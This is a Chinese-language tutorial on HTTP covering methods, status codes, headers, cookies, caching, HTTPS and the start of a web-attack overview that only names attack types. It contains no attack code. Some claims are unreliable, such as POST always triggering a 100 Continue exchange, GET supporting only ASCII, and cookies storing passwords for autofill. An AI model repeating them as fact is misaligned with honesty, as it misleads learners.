<h1 id="二-http-方法"><a class="markdownIt-Anchor" href="#二-http-方法"></a> 二、HTTP 方法</h1>
<p>客户端发送的  <strong>请求报文</strong>  第一行为请求行，包含了方法字段。</p>
<h2 id="get"><a class="markdownIt-Anchor" href="#get"></a> GET</h2>
<blockquote>
<p>获取资源</p>
</blockquote>
<p>当前网络请求中，绝大部分使用的是 GET 方法。</p>
<h2 id="post"><a class="markdownIt-Anchor" href="#post"></a> POST</h2>
<blockquote>
<p>传输实体主体</p>
</blockquote>
<p>POST 主要目的不是获取资源，而是传输存储在内容实体中的数据。</p>
<p>GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在内容实体。</p>
<p>GET 的传参方式相比于 POST 安全性较差，因为 GET 传的参数在 URL 中是可见的，可能会泄露私密信息。并且 GET 只支持 ASCII 字符，如果参数为中文则可能会出现乱码，而 POST 支持标准字符集。</p>
<p>GET 和 POST 的另一个区别是，使用 GET 方法，浏览器会把 HTTP Header 和 Data 一并发送出去，服务器响应 200（OK）并返回数据。而使用 POST 方法，浏览器先发送 Header，服务器响应 100（Continue）之后，浏览器再发送 Data，最后服务器响应 200（OK）并返回数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;test&#x2F;demo_form.asp?name1&#x3D;value1&amp;name2&#x3D;value2 HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;test&#x2F;demo_form.asp HTTP&#x2F;1.1</span><br><span class="line">Host: w3schools.com</span><br><span class="line">name1&#x3D;value1&amp;name2&#x3D;value2</span><br></pre></td></tr></table></figure>
<h2 id="head"><a class="markdownIt-Anchor" href="#head"></a> HEAD</h2>
<blockquote>
<p>获取报文首部</p>
</blockquote>
<p>和 GET 方法一样，但是不返回报文实体主体部分。</p>
<p>主要用于确认 URL 的有效性以及资源更新的日期时间等。</p>
<h2 id="put"><a class="markdownIt-Anchor" href="#put"></a> PUT</h2>
<blockquote>
<p>上传文件</p>
</blockquote>
<p>由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">PUT /new.html HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-type: text/html</span><br><span class="line">Content-length: 16</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>New File<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="patch"><a class="markdownIt-Anchor" href="#patch"></a> PATCH</h2>
<blockquote>
<p>对资源进行部分修改</p>
</blockquote>
<p>PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">PATCH /file.txt HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application/example</span><br><span class="line">If-Match: "e0023aa4e"</span><br><span class="line">Content-Length: 100</span><br><span class="line"></span><br><span class="line">[description of changes]</span><br></pre></td></tr></table></figure>
<h2 id="delete"><a class="markdownIt-Anchor" href="#delete"></a> DELETE</h2>
<blockquote>
<p>删除文件</p>
</blockquote>
<p>与 PUT 功能相反，并且同样不带验证机制。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">DELETE /file.html HTTP/1.1</span><br></pre></td></tr></table></figure>
<h2 id="options"><a class="markdownIt-Anchor" href="#options"></a> OPTIONS</h2>
<blockquote>
<p>查询支持的方法</p>
</blockquote>
<p>查询指定的 URL 能够支持的方法。</p>
<p>会返回 Allow: GET, POST, HEAD, OPTIONS 这样的内容。</p>
<h2 id="connect"><a class="markdownIt-Anchor" href="#connect"></a> CONNECT</h2>
<blockquote>
<p>要求用隧道协议连接代理</p>
</blockquote>
<p>要求在与代理服务器通信时建立隧道，使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">CONNECT www.example.com:443 HTTP/1.1</span><br></pre></td></tr></table></figure>
<div align="center"> <img src="http://opifddwc7.bkt.clouddn.com/18-4-1/47305187.jpg" width=""/> </div><br>
<h2 id="trace"><a class="markdownIt-Anchor" href="#trace"></a> TRACE</h2>
<blockquote>
<p>追踪路径</p>
</blockquote>
<p>服务器会将通信路径返回给客户端。</p>
<p>发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。</p>
<p>通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪），因此更不会去使用它。</p>
<h1 id="三-http-状态码"><a class="markdownIt-Anchor" href="#三-http-状态码"></a> 三、HTTP 状态码</h1>
<p>服务器返回的  <strong>响应报文</strong>  中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。</p>
<table>
<thead>
<tr>
<th style="text-align:center">状态码</th>
<th style="text-align:center">类别</th>
<th style="text-align:center">原因短语</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1XX</td>
<td style="text-align:center">Informational（信息性状态码）</td>
<td style="text-align:center">接收的请求正在处理</td>
</tr>
<tr>
<td style="text-align:center">2XX</td>
<td style="text-align:center">Success（成功状态码）</td>
<td style="text-align:center">请求正常处理完毕</td>
</tr>
<tr>
<td style="text-align:center">3XX</td>
<td style="text-align:center">Redirection（重定向状态码）</td>
<td style="text-align:center">需要进行附加操作以完成请求</td>
</tr>
<tr>
<td style="text-align:center">4XX</td>
<td style="text-align:center">Client Error（客户端错误状态码）</td>
<td style="text-align:center">服务器无法处理请求</td>
</tr>
<tr>
<td style="text-align:center">5XX</td>
<td style="text-align:center">Server Error（服务器错误状态码）</td>
<td style="text-align:center">服务器处理请求出错</td>
</tr>
</tbody>
</table>
<h2 id="2xx-成功"><a class="markdownIt-Anchor" href="#2xx-成功"></a> 2XX 成功</h2>
<ul>
<li>
<p><strong>200 OK</strong></p>
</li>
<li>
<p><strong>204 No Content</strong> ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。</p>
</li>
<li>
<p><strong>206 Partial Content</strong> ：表示客户端进行了范围请求。响应报文包含由 Content-Range 指定范围的实体内容。</p>
</li>
</ul>
<h2 id="3xx-重定向"><a class="markdownIt-Anchor" href="#3xx-重定向"></a> 3XX 重定向</h2>
<ul>
<li>
<p><strong>301 Moved Permanently</strong> ：永久性重定向</p>
</li>
<li>
<p><strong>302 Found</strong> ：临时性重定向</p>
</li>
<li>
<p><strong>303 See Other</strong> ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。</p>
</li>
<li>
<p>注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。</p>
</li>
<li>
<p><strong>304 Not Modified</strong> ：如果请求报文首部包含一些条件，例如：If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。</p>
</li>
<li>
<p><strong>307 Temporary Redirect</strong> ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。</p>
</li>
</ul>
<h2 id="4xx-客户端错误"><a class="markdownIt-Anchor" href="#4xx-客户端错误"></a> 4XX 客户端错误</h2>
<ul>
<li>
<p><strong>400 Bad Request</strong> ：请求报文中存在语法错误。</p>
</li>
<li>
<p><strong>401 Unauthorized</strong> ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。</p>
</li>
<li>
<p><strong>403 Forbidden</strong> ：请求被拒绝，服务器端没有必要给出拒绝的详细理由。</p>
</li>
<li>
<p><strong>404 Not Found</strong></p>
</li>
</ul>
<h2 id="5xx-服务器错误"><a class="markdownIt-Anchor" href="#5xx-服务器错误"></a> 5XX 服务器错误</h2>
<ul>
<li>
<p><strong>500 Internal Server Error</strong> ：服务器正在执行请求时发生错误。</p>
</li>
<li>
<p><strong>503 Service Unavilable</strong> ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。</p>
</li>
</ul>
<h1 id="四-http-首部"><a class="markdownIt-Anchor" href="#四-http-首部"></a> 四、HTTP 首部</h1>
<p>有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。</p>
<p>各种首部字段及其含义如下（不需要全记，仅供查阅）：</p>
<h2 id="通用首部字段"><a class="markdownIt-Anchor" href="#通用首部字段"></a> 通用首部字段</h2>
<table>
<thead>
<tr>
<th style="text-align:center">首部字段名</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Cache-Control</td>
<td style="text-align:center">控制缓存的行为</td>
</tr>
<tr>
<td style="text-align:center">Connection</td>
<td style="text-align:center">控制不再转发给代理的首部字段、管理持久连接</td>
</tr>
<tr>
<td style="text-align:center">Date</td>
<td style="text-align:center">创建报文的日期时间</td>
</tr>
<tr>
<td style="text-align:center">Pragma</td>
<td style="text-align:center">报文指令</td>
</tr>
<tr>
<td style="text-align:center">Trailer</td>
<td style="text-align:center">报文末端的首部一览</td>
</tr>
<tr>
<td style="text-align:center">Transfer-Encoding</td>
<td style="text-align:center">指定报文主体的传输编码方式</td>
</tr>
<tr>
<td style="text-align:center">Upgrade</td>
<td style="text-align:center">升级为其他协议</td>
</tr>
<tr>
<td style="text-align:center">Via</td>
<td style="text-align:center">代理服务器的相关信息</td>
</tr>
<tr>
<td style="text-align:center">Warning</td>
<td style="text-align:center">错误通知</td>
</tr>
</tbody>
</table>
<h2 id="请求首部字段"><a class="markdownIt-Anchor" href="#请求首部字段"></a> 请求首部字段</h2>
<table>
<thead>
<tr>
<th style="text-align:center">首部字段名</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Accept</td>
<td style="text-align:center">用户代理可处理的媒体类型</td>
</tr>
<tr>
<td style="text-align:center">Accept-Charset</td>
<td style="text-align:center">优先的字符集</td>
</tr>
<tr>
<td style="text-align:center">Accept-Encoding</td>
<td style="text-align:center">优先的内容编码</td>
</tr>
<tr>
<td style="text-align:center">Accept-Language</td>
<td style="text-align:center">优先的语言（自然语言）</td>
</tr>
<tr>
<td style="text-align:center">Authorization</td>
<td style="text-align:center">Web 认证信息</td>
</tr>
<tr>
<td style="text-align:center">Expect</td>
<td style="text-align:center">期待服务器的特定行为</td>
</tr>
<tr>
<td style="text-align:center">From</td>
<td style="text-align:center">用户的电子邮箱地址</td>
</tr>
<tr>
<td style="text-align:center">Host</td>
<td style="text-align:center">请求资源所在服务器</td>
</tr>
<tr>
<td style="text-align:center">If-Match</td>
<td style="text-align:center">比较实体标记（ETag）</td>
</tr>
<tr>
<td style="text-align:center">If-Modified-Since</td>
<td style="text-align:center">比较资源的更新时间</td>
</tr>
<tr>
<td style="text-align:center">If-None-Match</td>
<td style="text-align:center">比较实体标记（与 If-Match 相反）</td>
</tr>
<tr>
<td style="text-align:center">If-Range</td>
<td style="text-align:center">资源未更新时发送实体 Byte 的范围请求</td>
</tr>
<tr>
<td style="text-align:center">If-Unmodified-Since</td>
<td style="text-align:center">比较资源的更新时间（与 If-Modified-Since 相反）</td>
</tr>
<tr>
<td style="text-align:center">Max-Forwards</td>
<td style="text-align:center">最大传输逐跳数</td>
</tr>
<tr>
<td style="text-align:center">Proxy-Authorization</td>
<td style="text-align:center">代理服务器要求客户端的认证信息</td>
</tr>
<tr>
<td style="text-align:center">Range</td>
<td style="text-align:center">实体的字节范围请求</td>
</tr>
<tr>
<td style="text-align:center">Referer</td>
<td style="text-align:center">对请求中 URI 的原始获取方</td>
</tr>
<tr>
<td style="text-align:center">TE</td>
<td style="text-align:center">传输编码的优先级</td>
</tr>
<tr>
<td style="text-align:center">User-Agent</td>
<td style="text-align:center">HTTP 客户端程序的信息</td>
</tr>
</tbody>
</table>
<h2 id="响应首部字段"><a class="markdownIt-Anchor" href="#响应首部字段"></a> 响应首部字段</h2>
<table>
<thead>
<tr>
<th style="text-align:center">首部字段名</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Accept-Ranges</td>
<td style="text-align:center">是否接受字节范围请求</td>
</tr>
<tr>
<td style="text-align:center">Age</td>
<td style="text-align:center">推算资源创建经过时间</td>
</tr>
<tr>
<td style="text-align:center">ETag</td>
<td style="text-align:center">资源的匹配信息</td>
</tr>
<tr>
<td style="text-align:center">Location</td>
<td style="text-align:center">令客户端重定向至指定 URI</td>
</tr>
<tr>
<td style="text-align:center">Proxy-Authenticate</td>
<td style="text-align:center">代理服务器对客户端的认证信息</td>
</tr>
<tr>
<td style="text-align:center">Retry-After</td>
<td style="text-align:center">对再次发起请求的时机要求</td>
</tr>
<tr>
<td style="text-align:center">Server</td>
<td style="text-align:center">HTTP 服务器的安装信息</td>
</tr>
<tr>
<td style="text-align:center">Vary</td>
<td style="text-align:center">代理服务器缓存的管理信息</td>
</tr>
<tr>
<td style="text-align:center">WWW-Authenticate</td>
<td style="text-align:center">服务器对客户端的认证信息</td>
</tr>
</tbody>
</table>
<h2 id="实体首部字段"><a class="markdownIt-Anchor" href="#实体首部字段"></a> 实体首部字段</h2>
<table>
<thead>
<tr>
<th style="text-align:center">首部字段名</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Allow</td>
<td style="text-align:center">资源可支持的 HTTP 方法</td>
</tr>
<tr>
<td style="text-align:center">Content-Encoding</td>
<td style="text-align:center">实体主体适用的编码方式</td>
</tr>
<tr>
<td style="text-align:center">Content-Language</td>
<td style="text-align:center">实体主体的自然语言</td>
</tr>
<tr>
<td style="text-align:center">Content-Length</td>
<td style="text-align:center">实体主体的大小</td>
</tr>
<tr>
<td style="text-align:center">Content-Location</td>
<td style="text-align:center">替代对应资源的 URI</td>
</tr>
<tr>
<td style="text-align:center">Content-MD5</td>
<td style="text-align:center">实体主体的报文摘要</td>
</tr>
<tr>
<td style="text-align:center">Content-Range</td>
<td style="text-align:center">实体主体的位置范围</td>
</tr>
<tr>
<td style="text-align:center">Content-Type</td>
<td style="text-align:center">实体主体的媒体类型</td>
</tr>
<tr>
<td style="text-align:center">Expires</td>
<td style="text-align:center">实体主体过期的日期时间</td>
</tr>
<tr>
<td style="text-align:center">Last-Modified</td>
<td style="text-align:center">资源的最后修改日期时间</td>
</tr>
</tbody>
</table>
<h1 id="五-具体应用"><a class="markdownIt-Anchor" href="#五-具体应用"></a> 五、具体应用</h1>
<h2 id="cookie"><a class="markdownIt-Anchor" href="#cookie"></a> Cookie</h2>
<p>HTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。</p>
<p>Cookie 是服务器发送给客户端的数据，该数据会被保存在浏览器中，并且客户端的下一次请求报文会包含该数据。通过 Cookie 可以让服务器知道两个请求是否来自于同一个客户端，从而实现保持登录状态等功能。</p>
<h3 id="1-创建过程"><a class="markdownIt-Anchor" href="#1-创建过程"></a> 1. 创建过程</h3>
<p>服务器发送的响应报文包含 Set-Cookie 字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-type: text/html</span><br><span class="line">Set-Cookie: yummy_cookie=choco</span><br><span class="line">Set-Cookie: tasty_cookie=strawberry</span><br><span class="line"></span><br><span class="line">[page content]</span><br></pre></td></tr></table></figure>
<p>客户端之后发送请求时，会从浏览器中读出 Cookie 值，在请求报文中包含 Cookie 字段。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GET /sample_page.html HTTP/1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: yummy_cookie=choco; tasty_cookie=strawberry</span><br></pre></td></tr></table></figure>
<h3 id="2-分类"><a class="markdownIt-Anchor" href="#2-分类"></a> 2. 分类</h3>
<ul>
<li>会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。</li>
<li>持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）之后就成为了持久性的 Cookie。</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure>
<h3 id="3-set-cookie"><a class="markdownIt-Anchor" href="#3-set-cookie"></a> 3. Set-Cookie</h3>
<table>
<thead>
<tr>
<th style="text-align:center">属性</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">NAME=VALUE</td>
<td>赋予 Cookie 的名称和其值（必需项）</td>
</tr>
<tr>
<td style="text-align:center">expires=DATE</td>
<td>Cookie 的有效期（若不明确指定则默认为浏览器关闭前为止）</td>
</tr>
<tr>
<td style="text-align:center">path=PATH</td>
<td>将服务器上的文件目录作为 Cookie 的适用对象（若不指定则默认为文档所在的文件目录）</td>
</tr>
<tr>
<td style="text-align:center">domain=域名</td>
<td>作为 Cookie 适用对象的域名（若不指定则默认为创建 Cookie 的服务器的域名）</td>
</tr>
<tr>
<td style="text-align:center">Secure</td>
<td>仅在 HTTPs 安全通信时才会发送 Cookie</td>
</tr>
<tr>
<td style="text-align:center">HttpOnly</td>
<td>加以限制，使 Cookie 不能被 JavaScript 脚本访问</td>
</tr>
</tbody>
</table>
<h3 id="4-session-和-cookie-区别"><a class="markdownIt-Anchor" href="#4-session-和-cookie-区别"></a> 4. Session 和 Cookie 区别</h3>
<p>Session 是服务器用来跟踪用户的一种手段，每个 Session 都有一个唯一标识：Session ID。当服务器创建了一个 Session 时，给客户端发送的响应报文包含了 Set-Cookie 字段，其中有一个名为 sid 的键值对，这个键值对就是 Session ID。客户端收到后就把 Cookie 保存在浏览器中，并且之后发送的请求报文都包含 Session ID。HTTP 就是通过 Session 和 Cookie 这两种方式一起合作来实现跟踪用户状态的，Session 用于服务器端，Cookie 用于客户端。</p>
<h3 id="5-浏览器禁用-cookie-的情况"><a class="markdownIt-Anchor" href="#5-浏览器禁用-cookie-的情况"></a> 5. 浏览器禁用 Cookie 的情况</h3>
<p>会使用 URL 重写技术，在 URL 后面加上 sid=xxx 。</p>
<h3 id="6-使用-cookie-实现用户名和密码的自动填写"><a class="markdownIt-Anchor" href="#6-使用-cookie-实现用户名和密码的自动填写"></a> 6. 使用 Cookie 实现用户名和密码的自动填写</h3>
<p>网站脚本会自动从保存在浏览器中的 Cookie 读取用户名和密码，从而实现自动填写。</p>
<p>但是如果 Set-Cookie 指定了 HttpOnly 属性，就无法通过 Javascript 脚本获取 Cookie 信息，这是出于安全性考虑。</p>
<h2 id="缓存"><a class="markdownIt-Anchor" href="#缓存"></a> 缓存</h2>
<p><a href="http://www.cnblogs.com/skylar/p/browser-http-caching.html" target="_blank" rel="noopener">扩展阅读：透过浏览器看HTTP缓存</a></p>
<h3 id="1-优点"><a class="markdownIt-Anchor" href="#1-优点"></a> 1. 优点</h3>
<ol>
<li>降低服务器的负担；</li>
<li>提高响应速度（缓存资源比服务器上的资源离客户端更近）。</li>
</ol>
<h3 id="2-实现方法"><a class="markdownIt-Anchor" href="#2-实现方法"></a> 2. 实现方法</h3>
<ol>
<li>让代理服务器进行缓存；</li>
<li>让客户端浏览器进行缓存。</li>
</ol>
<h3 id="3-cache-control-字段"><a class="markdownIt-Anchor" href="#3-cache-control-字段"></a> 3. Cache-Control 字段</h3>
<p>HTTP 通过 Cache-Control 首部字段来控制缓存。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Cache-Control: private, max-age=0, no-cache</span><br></pre></td></tr></table></figure>
<h3 id="4-no-cache-指令"><a class="markdownIt-Anchor" href="#4-no-cache-指令"></a> 4. no-cache 指令</h3>
<p>该指令出现在请求报文的 Cache-Control 字段中，表示缓存服务器需要先向原服务器验证缓存资源是否过期；</p>
<p>该指令出现在响应报文的 Cache-Control 字段中，表示缓存服务器在进行缓存之前需要先验证缓存资源的有效性。</p>
<h3 id="5-no-store-指令"><a class="markdownIt-Anchor" href="#5-no-store-指令"></a> 5. no-store 指令</h3>
<p>该指令表示缓存服务器不能对请求或响应的任何一部分进行缓存。</p>
<p>no-cache 不表示不缓存，而是缓存之前需要先进行验证，no-store 才是不进行缓存。</p>
<h3 id="6-max-age-指令"><a class="markdownIt-Anchor" href="#6-max-age-指令"></a> 6. max-age 指令</h3>
<p>该指令出现在请求报文的 Cache-Control 字段中，如果缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。</p>
<p>该指令出现在响应报文的 Cache-Control 字段中，表示缓存资源在缓存服务器中保存的时间。</p>
<p>Expires 字段也可以用于告知缓存服务器该资源什么时候会过期。在 HTTP/1.1 中，会优先处理 Cache-Control : max-age 指令；而在 HTTP/1.0 中，Cache-Control : max-age 指令会被忽略掉。</p>
<h2 id="持久连接"><a class="markdownIt-Anchor" href="#持久连接"></a> 持久连接</h2>
<p>当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问 HTML 页面资源，还会请求图片资源，如果每进行一次 HTTP 通信就要断开一次 TCP 连接，连接建立和断开的开销会很大。持久连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。</p>
<div align="center"> <img src="http://opifddwc7.bkt.clouddn.com/18-4-1/10957036.jpg" width=""/> </div><br>
<p>持久连接需要使用 Connection 首部字段进行管理。HTTP/1.1 开始 HTTP 默认是持久化连接的，如果要断开 TCP 连接，需要由客户端或者服务器端提出断开，使用 Connection : close；而在 HTTP/1.1 之前默认是非持久化连接的，如果要维持持续连接，需要使用 Connection : Keep-Alive。</p>
<p><strong>管线化方式</strong>  可以同时发送多个请求和响应，而不需要发送一个请求然后等待响应之后再发下一个请求。</p>
<h2 id="编码"><a class="markdownIt-Anchor" href="#编码"></a> 编码</h2>
<p>编码（Encoding）主要是为了对实体进行压缩。常用的编码有：gzip、compress、deflate、identity，其中 identity 表示不执行压缩的编码格式。</p>
<h2 id="分块传输编码"><a class="markdownIt-Anchor" href="#分块传输编码"></a> 分块传输编码</h2>
<p>Chunked Transfer Coding，可以把数据分割成多块，让浏览器逐步显示页面。</p>
<h2 id="多部分对象集合"><a class="markdownIt-Anchor" href="#多部分对象集合"></a> 多部分对象集合</h2>
<p>一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。</p>
<p>例如，上传多个表单时可以使用如下方式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=AaB03x</span><br><span class="line"></span><br><span class="line">--AaB03x</span><br><span class="line">Content-Disposition: form-data; name="submit-name"</span><br><span class="line"></span><br><span class="line">Larry</span><br><span class="line">--AaB03x</span><br><span class="line">Content-Disposition: form-data; name="files"; filename="file1.txt"</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">... contents of file1.txt ...</span><br><span class="line">--AaB03x--</span><br></pre></td></tr></table></figure>
<h2 id="范围请求"><a class="markdownIt-Anchor" href="#范围请求"></a> 范围请求</h2>
<p>如果网络出现中断，服务器只发送了一部分数据，范围请求使得客户端能够只请求未发送的那部分数据，从而避免服务器端重新发送所有数据。</p>
<p>在请求报文首部中添加 Range 字段指定请求的范围，请求成功的话服务器发送 206 Partial Content 状态。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GET /z4d4kWk.jpg HTTP/1.1</span><br><span class="line">Host: i.imgur.com</span><br><span class="line">Range: bytes=0-1023</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 206 Partial Content</span><br><span class="line">Content-Range: bytes 0-1023/146515</span><br><span class="line">Content-Length: 1024</span><br><span class="line">...</span><br><span class="line">(binary content)</span><br></pre></td></tr></table></figure>
<h2 id="内容协商"><a class="markdownIt-Anchor" href="#内容协商"></a> 内容协商</h2>
<p>通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。</p>
<p>涉及以下首部字段：Accept、Accept-Charset、Accept-Encoding、Accept-Language、Content-Language。</p>
<h2 id="虚拟主机"><a class="markdownIt-Anchor" href="#虚拟主机"></a> 虚拟主机</h2>
<p>使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。</p>
<h2 id="通信数据转发"><a class="markdownIt-Anchor" href="#通信数据转发"></a> 通信数据转发</h2>
<h3 id="1-代理"><a class="markdownIt-Anchor" href="#1-代理"></a> 1. 代理</h3>
<p>代理服务器接受客户端的请求，并且转发给其它服务器。</p>
<p>使用代理的主要目的是：缓存、网络访问控制以及访问日志记录。</p>
<p>代理服务器分为正向代理和反向代理两种，用户察觉得到正向代理的存在，而反向代理一般位于内部网络中，用户察觉不到。</p>
<div align="center"> <img src="http://opifddwc7.bkt.clouddn.com/18-4-1/94698424.jpg" width=""/> </div><br>
<div align="center"> <img src="http://opifddwc7.bkt.clouddn.com/18-4-1/28968460.jpg" width=""/> </div><br>
<h3 id="2-网关"><a class="markdownIt-Anchor" href="#2-网关"></a> 2. 网关</h3>
<p>与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。</p>
<h3 id="3-隧道"><a class="markdownIt-Anchor" href="#3-隧道"></a> 3. 隧道</h3>
<p>使用 SSL 等加密手段，为客户端和服务器之间建立一条安全的通信线路。隧道本身不去解析 HTTP 请求。</p>
<h1 id="六-https"><a class="markdownIt-Anchor" href="#六-https"></a> 六、HTTPs</h1>
<p>HTTP 有以下安全性问题：</p>
<ol>
<li>使用明文进行通信，内容可能会被窃听；</li>
<li>不验证通信方的身份，通信方的身份有可能遭遇伪装；</li>
<li>无法证明报文的完整性，报文有可能遭篡改。</li>
</ol>
<p>HTTPs 并不是新协议，而是 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信。也就是说使用了隧道进行通信。</p>
<p>通过使用 SSL，HTTPs 具有了加密、认证和完整性保护。</p>
<div align="center"> <img src="http://opifddwc7.bkt.clouddn.com/18-4-1/26733654.jpg" width="700"/> </div><br>
<h2 id="加密"><a class="markdownIt-Anchor" href="#加密"></a> 加密</h2>
<h3 id="1-对称密钥加密"><a class="markdownIt-Anchor" href="#1-对称密钥加密"></a> 1. 对称密钥加密</h3>
<p>Symmetric-Key Encryption，加密的加密和解密使用同一密钥。</p>
<ul>
<li>优点：运算速度快；</li>
<li>缺点：密钥容易被获取。</li>
</ul>
<div align="center"> <img src="http://opifddwc7.bkt.clouddn.com/18-4-1/95717654.jpg" width=""/> </div><br>
<h3 id="2-公开密钥加密"><a class="markdownIt-Anchor" href="#2-公开密钥加密"></a> 2. 公开密钥加密</h3>
<p>Public-Key Encryption，使用一对密钥用于加密和解密，分别为公开密钥和私有密钥。公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。</p>
<ul>
<li>优点：更为安全；</li>
<li>缺点：运算速度慢；</li>
</ul>
<div align="center"> <img src="http://opifddwc7.bkt.clouddn.com/18-4-1/57436180.jpg" width=""/> </div><br>
<h3 id="3-https-采用的加密方式"><a class="markdownIt-Anchor" href="#3-https-采用的加密方式"></a> 3. HTTPs 采用的加密方式</h3>
<p>HTTPs 采用混合的加密机制，使用公开密钥加密用于传输对称密钥，之后使用对称密钥加密进行通信。（下图中的 Session Key 就是对称密钥）</p>
<div align="center"> <img src="http://opifddwc7.bkt.clouddn.com/18-4-1/24643488.jpg" width="600"/> </div><br>
<h2 id="认证"><a class="markdownIt-Anchor" href="#认证"></a> 认证</h2>
<p>通过使用  <strong>证书</strong>  来对通信方进行认证。</p>
<p>数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。</p>
<p>进行 HTTPs 通信时，服务器会把证书发送给客户端，客户端取得其中的公开密钥之后，先进行验证，如果验证通过，就可以开始通信。</p>
<div align="center"> <img src="http://opifddwc7.bkt.clouddn.com/18-4-1/13339779.jpg" width=""/> </div><br>
<p>使用 OpenSSL 这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书。浏览器在访问该服务器时，会显示“无法确认连接安全性”或“该网站的安全证书存在问题”等警告消息。</p>
<h2 id="完整性"><a class="markdownIt-Anchor" href="#完整性"></a> 完整性</h2>
<p>SSL 提供报文摘要功能来验证完整性。</p>
<h1 id="七-web-攻击技术"><a class="markdownIt-Anchor" href="#七-web-攻击技术"></a> 七、Web 攻击技术</h1>
<h2 id="攻击模式"><a class="markdownIt-Anchor" href="#攻击模式"></a> 攻击模式</h2>
<h3 id="1-主动攻击"><a class="markdownIt-Anchor" href="#1-主动攻击"></a> 1. 主动攻击</h3>
<p>直接攻击服务器，具有代表性的有 SQL 注入和 OS 命令注入。</p>
<h3 id="2-被动攻击"><a class="markdownIt-Anchor" href="#2-被动攻击"></a> 2. 被动攻击</h3>
<p>设下圈套，让用户发送有攻击代码的 HTTP 请求，用户会泄露 Cookie 等个人信息，具有代表性的有跨站脚本攻击和跨站请求伪造。</p>
<h2 id="跨站脚本攻击"><a class="markdownIt-Anchor" href="#跨站脚本攻击"></a> 跨站脚本攻击</h2>
